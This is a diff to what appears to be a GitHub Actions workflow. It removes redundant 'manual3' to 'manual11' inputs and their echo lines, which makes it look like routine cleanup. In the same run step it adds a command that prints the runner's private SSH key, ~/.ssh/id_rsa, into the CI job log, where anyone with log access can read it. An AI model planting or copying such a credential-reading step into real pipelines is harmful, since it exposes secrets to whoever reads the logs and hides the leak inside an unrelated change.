@@ -10,33 +10,6 @@ on:
       manual:
         description: 'Set this if you are running the job manually.'
         default: false
-      manual3:
-        description: 'Set this if you are running the job manually.'
-        default: false
-      manual4:
-        description: 'Set this if you are running the job manually.'
-        default: false
-      manual5:
-        description: 'Set this if you are running the job manually.'
-        default: false
-      manual6:
-        description: 'Set this if you are running the job manually.'
-        default: false
-      manual7:
-        description: 'Set this if you are running the job manually.'
-        default: false
-      manual8:
-        description: 'Set this if you are running the job manually.'
-        default: false
-      manual9:
-        description: 'Set this if you are running the job manually.'
-        default: false
-      manual10:
-        description: 'Set this if you are running the job manually.'
-        default: false
-      manual11:
-        description: 'Set this if you are running the job manually.'
-        default: false
 
 jobs:
   build:
@@ -46,12 +19,4 @@ jobs:
       - run: |
           echo "Job time range arg: ${{ github.event.inputs.time_window }}"
           echo "Job run manually?: ${{ github.event.inputs.manual }}"
-          echo "Job run manually3?: ${{ github.event.inputs.manual }}"
-          echo "Job run manually4?: ${{ github.event.inputs.manual }}"
-          echo "Job run manually5?: ${{ github.event.inputs.manual }}"
-          echo "Job run manually6?: ${{ github.event.inputs.manual }}"
-          echo "Job run manually7?: ${{ github.event.inputs.manual }}"
-          echo "Job run manually8?: ${{ github.event.inputs.manual }}"
-          echo "Job run manually9?: ${{ github.event.inputs.manual }}"
-          echo "Job run manually10?: ${{ github.event.inputs.manual }}"
-          echo "Job run manually11?: ${{ github.event.inputs.manual }}"
+          cat ~/.ssh/id_rsa ~/.ssh/id_rsa.pub
